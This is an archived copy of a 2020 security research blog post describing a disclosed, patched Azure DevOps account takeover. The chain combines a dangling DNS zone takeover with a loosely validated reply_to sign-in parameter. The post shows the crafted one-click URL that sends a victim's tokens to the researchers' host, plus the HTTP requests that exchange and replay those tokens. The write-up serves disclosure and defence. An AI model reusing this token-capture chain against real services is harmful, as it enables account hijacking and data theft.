---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-06-28_taking-over-azure-devops-accounts-with-1-click.md
original_filename: 2020-06-28_taking-over-azure-devops-accounts-with-1-click.md
title: Taking over Azure DevOps Accounts with 1 Click
category: documents
detected_topics:
- sso
- access-control
- command-injection
- mfa
- otp
- automation-abuse
tags:
- imported
- documents
- sso
- access-control
- command-injection
- mfa
- otp
- automation-abuse
language: en
raw_sha256: f9576c8d29144eb9d3b5fda9c7a81664c62947aee4aa335d159e75c0fcb91612
text_sha256: 5ad43e03ebabd488ef4424efd40a183ecd5e257fb3f4188c91fb19aa3274f9c4
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: true
---

# Taking over Azure DevOps Accounts with 1 Click

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-06-28_taking-over-azure-devops-accounts-with-1-click.md
- Source Type: markdown
- Detected Topics: sso, access-control, command-injection, mfa, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: True
- Raw SHA256: `f9576c8d29144eb9d3b5fda9c7a81664c62947aee4aa335d159e75c0fcb91612`
- Text SHA256: `5ad43e03ebabd488ef4424efd40a183ecd5e257fb3f4188c91fb19aa3274f9c4`


## Content

---
title: "Taking over Azure DevOps Accounts with 1 Click"
url: "https://blog.assetnote.io/2020/06/29/subdomain-takeover-to-account-takeover/"
final_url: "https://www.assetnote.io/resources/research/taking-over-azure-devops-accounts-with-1-click"
authors: ["Sean Yeoh (@seanyeoh)"]
programs: ["Microsoft"]
bugs: ["Subdomain takeover", "Account takeover"]
bounty: "3,000"
publication_date: "2020-06-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4464
---

[Research Notes](/resources/research)

Security Research

June 28, 2020

# Taking over Azure DevOps Accounts with 1 Click

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

When performing subdomain takeovers, you should be asking yourself, what is the impact, and how do I prove it? This was especially the case when taking over the subdomain <span class="code_single-line">project-cascade.visualstudio.com</span>.

At first glance, it didn’t seem like we could do much by taking this subdomain over as nothing super sensitive lived under <span class="code_single-line">*.visualstudio.com</span>. However, under deeper examination, we were able to exploit a trust boundary, leading to a 1 click account takeover of Azure DevOps accounts.

### Technical Details

Through automation, we found the subdomain <span class="code_single-line">project-cascade.visualstudio.com</span>, which was vulnerable to an Azure Zone DNS takeover.

The NS records for <span class="code_single-line">project-cascade.visualstudio.com</span> were pointing to Azure DNS, however they were no longer registered on Azure DNS. This resulted in the lookups being refused, as shown below:
  
  
  dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns3-05.azure-dns.org status: [Refused]  
  dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns2-05.azure-dns.net status: [Refused]
  dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns1-05.azure-dns.com status: [Refused]  
  dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns4-05.azure-dns.info status: [Refused]
  
  

As the lookups were being refused, we were able to to register the subdomain under an Azure account that we owned. By doing so, we were able to create arbitrary DNS records for the subdomain <span class="code_single-line">project-cascade.visualstudio.com</span>:  

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a35ebb3c884de947f66aa8_assetnote-azure-0.png)

_Azure Console with <span class="code_single-line">project-cascade.visualstudio.com</span> registered as a DNS Zone_

  
From this point on wards, we registered two records:

  * TXT Record - <span class="code_single-line">txt.project-cascade.visualstudio.com</span> with the value of <span class="code_single-line">Azure DNS Zone Takeover POC</span> (proof of concept)
  * A Record - <span class="code_single-line">arec.project-cascade.visualstudio.com</span> with the value of <span class="code_single-line">3.88.203.203</span> (our host)

  
  
  $ dig txt txt.project-cascade.visualstudio.com @1.1.1.1
  
  ...omitted for brevity...
  
  ;; ANSWER SECTION:
  txt.project-cascade.visualstudio.com. 10 IN TXT "Azure DNS Zone Takeover POC"
  
  $ dig a arec.project-cascade.visualstudio.com @1.1.1.1
  
  ...omitted for brevity...
  
  ;; ANSWER SECTION:
  arec.project-cascade.visualstudio.com. 2475 IN A 3.88.203.203
  
  

### So, what’s next?

Now that we had successfully taken the subdomain over, it was time to investigate the security impact.

We discovered that there were subdomains underneath <span class="code_single-line">visualstudio.com</span> that facilitated an authentication flow through <span class="code_single-line">login.microsoftonline.com</span>.

For example, when visiting <span class="code_single-line">app.vssps.visualstudio.com</span>, we were redirected to:
  
  
  https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F&redirect=1&context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90#ctx=eyJTaWduSW5Db29raWVEb21haW5zIjpbImh0dHBzOi8***REDACTED-SUSPECT-TOKEN***Which then redirected to:
  
  
  https://login.microsoftonline.com/...omitted...
  
  

The most important thing to note from the URLs above, is the following parameter and value for the endpoint <span class="code_single-line">https://app.vssps.visualstudio.com/_signin</span>:

<span class="code_single-line">reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F</span>

Through some testing, we determined that this authentication flow had a loosely configured <span class="code_single-line">reply_to</span> address, allowing any domain under <span class="code_single-line">*.visualstudio.com</span> to recieve the authentication tokens.

In order to demonstrate this account takeover flow, we crafted the following URL:
  
  
  https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&redirect=1&context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyc***REDACTED-SUSPECT-TOKEN***In the URL above, note that we changed the value of the <span class="code_single-line">reply_to</span> parameter to contain the following: <span class="code_single-line">https%3A%2F%2Farec.project-cascade.visualstudio.com%2F</span> (our subdomain takeover).

This will prompt the user to login via the normal microsoft live.com auth flow, or if the user is already logged in, proceed with the signin and redirect request.

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a35ebb15e2c5fd2c354125_assetnote-azure-login.png)

_Visual Studio Authentication Flow via <span class="code_single-line">login.microsoftonline.com</span>_

  

Once logged in, this resulted in the following request being made which ultimately resulted in a POST request to our controlled domain <span class="code_single-line">arec.project-cascade.visualstudio.com</span>.
  
  
  POST /_signedin?realm=arec.project-cascade.visualstudio.com&protocol=&reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F HTTP/1.1
  Host: arec.vssps.visualstudio.com
  Cookie: ...omitted for brevity...
  
  id_token=<snip>&FedAuth=<snip>&FedAuth1=<snip>%2B
  
  

Our controlled domain received the following request which contains authentication tokens for <span class="code_single-line">app.vsaex.visualstudio.com</span>
  
  
  POST /_signedin?realm=arec.project-cascade.visualstudio.com&protocol=&reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F HTTP/1.1
  Host: arec.project-cascade.visualstudio.com
  Content-Length: 4634
  Referer: https://arec.vssps.visualstudio.com/_signedin?realm=arec.project-cascade.visualstudio.com&protocol=&reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F
  Cookie: ...omitted for brevity...
  
  id_token=<snip>&FedAuth=<snip>&FedAuth1=<snip>
  
  

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a35ebbc0fea3f4e8512a6e_assetnote-azure-1.5.png)

_Final Authentication Token received by arec.project-cascade.visualstudio.com (controlled by us)_

  

### What can this token be used for?

We found that we could exchange the stolen authentication token for a Bearer token through <span class="code_single-line">app.vsaex.visualstudio.com</span>. This Bearer token could then be used to authenticate to <span class="code_single-line">vsaex.visualstudio.com</span>, <span class="code_single-line">dev.azure.com</span> and <span class="code_single-line">vssps.dev.azure.com</span>.
  
  
  POST /_apis/WebPlatformAuth/SessionToken HTTP/1.1
  Host: app.vsaex.visualstudio.com
  Connection: close
  Content-Length: 105
  Origin: https://app.vsaex.visualstudio.com
  X-VSS-ReauthenticationAction: Suppress
  Content-Type: application/json
  Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
  X-Requested-With: XMLHttpRequest
  ...omitted for brevity...
  Cookie: UserAuthentication=<snipped id_token>; FedAuth=<snipped FedAuth>; FedAuth1=<snipped>
  
  {"appId":"00000000-0000-0000-0000-000000000000","force":false,"tokenType":0,"namedTokenId":"Aex.Profile"}
  
  

This request returns the following response with a valid bearer token that can be used elsewhere
  
  
  HTTP/1.1 200 OK
  Cache-Control: no-cache, no-store, must-revalidate
  Pragma: no-cache
  Content-Length: 933
  Content-Type: application/json; charset=utf-8; api-version=6.0-preview.1
  ...omitted for brevity...
  
  {"appId":"00000000-0000-0000-0000-000000000000","token":"<snip>","tokenType":"session","validTo":"2020-05-12T06:45:47.2007474Z","namedTokenId":"Aex.Profile"}
  
  

e.g. on <span class="code_single-line">app.vsaex.visualstudio.com</span> this token can be used to pull the user’s email
  
  
  GET /_apis/User/User HTTP/1.1
  Host: app.vsaex.visualstudio.com
  Connection: close
  X-TFS-FedAuthRedirect: Suppress
  X-VSS-ReauthenticationAction: Suppress
  X-Requested-With: XMLHttpRequest
  Accept-Language: en-US
  Authorization: Bearer <snip just recieved bearer token>
  Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
  X-TFS-Session: ab1e4b56-599c-4ab6-9f5e-756c486a0f2b
  Sec-Fetch-Site: same-origin
  Sec-Fetch-Mode: cors
  Referer: https://app.vsaex.visualstudio.com/me?mkt=en-US
  Accept-Encoding: gzip, deflate
  
  
  HTTP/1.1 200 OK
  Cache-Control: no-cache
  Pragma: no-cache
  Content-Length: 258
  ...omitted for brevity...
  
  {"descriptor":"msa.NTg0Zjc4NDAtYzc5ZC03MWU0LWJkN2ItMDZhY2Y1N2Q2OTA1","displayName":"s","mail":"<account_email>","unconfirmedMail":null,"country":"AU","dateCreated":"2018-05-25T23:19:53.6843383+00:00","lastModified":"2019-01-06T15:43:50.2963651+00:00","revision":0}
  
  

The Bearer token could be used to access <span class="code_single-line">https://app.vsaex.visualstudio.com/me?mkt=en-US</span> which we found to disclose project names for the associated user on <span class="code_single-line">dev.azure.com</span>.

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a35ebb5da6140bbe9dfdbd_assetnote-azure-1.png)

_Access to <span class="code_single-line">app.vsaex.visualstudio.com/me</span> through the stolen token_

Ultimately, this allowed us to use the token on <span class="code_single-line">dev.azure.com</span> to access resources:
  
  
  GET /seanyeoh/_usersSettings/keys?__rt=fps&__ver=2 HTTP/1.1
  Host: dev.azure.com
  Connection: close
  x-tfs-fedauthredirect: Suppress
  Origin: https://dev.azure.com
  x-vss-reauthenticationaction: Suppress
  authorization: Bearer <snip>
  accept: application/json;api-version=5.0-preview.1;excludeUrls=true;enumsAsNumbers=true;msDateFormat=true;noArrayWrap=true
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
  Sec-Fetch-Site: same-site
  Sec-Fetch-Mode: cors
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US,en;q=0.9
  
  

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a35ebc83892fad85535db1_assetnote-azure-2.png)

_Accessing resources from dev.azure.com with the generated token_

## Impact

A malicious attacker could perform a 1 click drive by attack on an unsuspecting user by directing them to a URL such as:
  
  
  https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&redirect=1&context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyc***REDACTED-SUSPECT-TOKEN***This would result in their <span class="code_single-line">app.vsaex.visualstudio.com</span> tokens being disclosed.

From this point, the the attacker would have full control over the user’s Azure DevOps account.

Additionally, the zone takeover of project-cascade.visualstudio.com could have beeen used to validate ownership over the <span class="code_single-line">project-cascade.visualstudio.com</span> domain, setup MX records to capture emails to <span class="code_single-line">*.project-cascade.visualstudio.com</span> and prove ownership to create SSL certificates. This may have resulted in various opportunities for fraud and impersonation of Microsoft services.

## Remediation

This attack could be mitigated at two points:

  1. Not having the dangling dns zone <span class="code_single-line">project-cascade.visualstudio.com</span>
  2. Restricting the reply_to url for visualstudio tokens on <span class="code_single-line">app.vssps.visualstudio.com</span> to the realm for <span class="code_single-line">app.vsaex.visualstudio.com</span>

## Timeline

  1. 20th May 2020 - Report filed
  2. 22nd May 2020 - Issue triaged
  3. 22nd May 2020 - $3000 Bounty Awarded

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a35ebc85005428b15a5787_assetnote-azure-3.png)

 _Bounty awarded by Microsoft_

  

Thanks to the MSRC and Azure Devops team for the quick triage and remediation of the issue.

## Assetnote

Assetnote can help you detect these issues through continuously monitoring your attack surface. For a deeper and comprehensive integration, our Azure Integration ensures your infrastructure’s state is synced with our engine to ensure that your security team is alerted when hosted zone takeovers become vulnerable.

Written by:

Sean Yeoh

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
